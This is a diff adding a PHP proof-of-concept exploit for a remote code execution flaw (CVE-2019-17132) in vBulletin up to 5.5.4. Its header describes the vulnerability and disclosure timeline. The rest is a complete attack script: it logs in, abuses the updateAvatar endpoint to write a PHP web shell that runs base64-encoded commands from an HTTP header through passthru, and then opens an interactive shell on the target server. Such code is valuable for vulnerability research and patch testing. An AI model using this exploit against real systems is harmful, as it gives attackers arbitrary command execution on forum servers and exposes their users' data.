@@ -1,0 +1,121 @@
+<?php
+
+/*
+    ---------------------------------------------------------------------
+    vBulletin <= 5.5.4 (updateAvatar) Remote Code Execution Vulnerability
+    ---------------------------------------------------------------------
+    
+    author..............: Egidio Romano aka EgiX
+    mail................: n0b0d13s[at]gmail[dot]com
+    software link.......: https://www.vbulletin.com/
+    
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+    
+    [-] Vulnerability Description:
+      
+    User input passed through the "data[extension]" and "data[filedata]" parameters to
+    the "ajax/api/user/updateAvatar" endpoint is not properly validated before being used
+    to update users' avatars. This can be exploited to inject and execute arbitrary PHP code.
+    Successful exploitation of this vulnerability requires the "Save Avatars as Files" option
+    to be enabled (disabled by default).
+
+    [-] Disclosure timeline:
+    
+    [30/09/2019] - Vendor notified
+    [03/10/2019] - Patch released: https://bit.ly/2OptAzI
+    [04/10/2019] - CVE number assigned (CVE-2019-17132)
+    [07/10/2019] - Public disclosure
+
+*/
+
+set_time_limit(0);
+error_reporting(E_ERROR);
+
+if (!extension_loaded("curl")) die("[-] cURL extension required!\n");
+
+print "+-------------------------------------------------------------------------+";
+print "\n| vBulletin <= 5.5.4 (updateAvatar) Remote Code Execution Exploit by EgiX |";
+print "\n+-------------------------------------------------------------------------+\n";
+
+if ($argc != 4)
+{
+	print "\nUsage......: php $argv[0] <URL> <Username> <Password>\n";
+	print "\nExample....: php $argv[0] http://localhost/vb/ user passwd";
+	print "\nExample....: php $argv[0] https://vbulletin.com/ evil hacker\n\n";
+	die();
+}
+
+list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]];
+
+$ch = curl_init();
+
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_HEADER, true);
+
+print "\n[-] Logging in with username '{$user}' and password '{$pass}'\n";
+
+curl_setopt($ch, CURLOPT_URL, $url);
+
+if (!preg_match("/Cookie: .*sessionhash=[^;]+/", curl_exec($ch), $sid)) die("[-] Session ID not found!\n");
+
+curl_setopt($ch, CURLOPT_URL, "{$url}?routestring=auth/login");
+curl_setopt($ch, CURLOPT_HTTPHEADER, $sid);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "username={$user}&password={$pass}");
+
+if (!preg_match("/Cookie: .*sessionhash=[^;]+/", curl_exec($ch), $sid)) die("[-] Login failed!\n");
+
+print "[-] Logged-in! Retrieving security token...\n";
+
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_POST, false);
+curl_setopt($ch, CURLOPT_HTTPHEADER, $sid);
+
+if (!preg_match('/token": "([^"]+)"/', curl_exec($ch), $token)) die("[-] Security token not found!\n");
+
+print "[-] Uploading new avatar...\n";
+
+$params = ["profilePhotoFile" => new CURLFile("avatar.jpeg"), "securitytoken" => $token[1]];
+
+curl_setopt($ch, CURLOPT_URL, "{$url}?routestring=profile/upload-profilepicture");
+curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+curl_setopt($ch, CURLOPT_HEADER, false);
+
+if (($path = (json_decode(curl_exec($ch)))->avatarpath) == null) die("[-] Upload failed!\n");
+
+if (preg_match('/image\.php\?/', $path)) die("[-] Sorry, the 'Save Avatars as Files' option is disabled!\n");
+
+print "[-] Updating avatar with PHP shell...\n";
+
+$php_code = '<?php print("____"); passthru(base64_decode($_SERVER["HTTP_CMD"])); ?>';
+
+$params = ["routestring" => "ajax/api/user/updateAvatar",
+           "userid" => 0,
+           "avatarid" => 0,
+           "data[extension]" => "php",
+           "data[filedata]" => $php_code,
+           "securitytoken" => $token[1]];
+
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
+
+if (curl_exec($ch) !== "true") die("[-] Update failed!\n");
+
+print "[-] Launching shell...\n";
+
+preg_match('/(\d+)\.jpeg/', $path, $m);
+$path = preg_replace('/(\d+)\.jpeg/', ($m[1]+1).".php", $path);
+
+curl_setopt($ch, CURLOPT_URL, "{$url}core/{$path}");
+curl_setopt($ch, CURLOPT_POST, false);
+
+while(1)
+{
+    print "\nvb-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ["CMD: ".base64_encode($cmd)]);
+    preg_match('/____(.*)/s', curl_exec($ch), $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+}
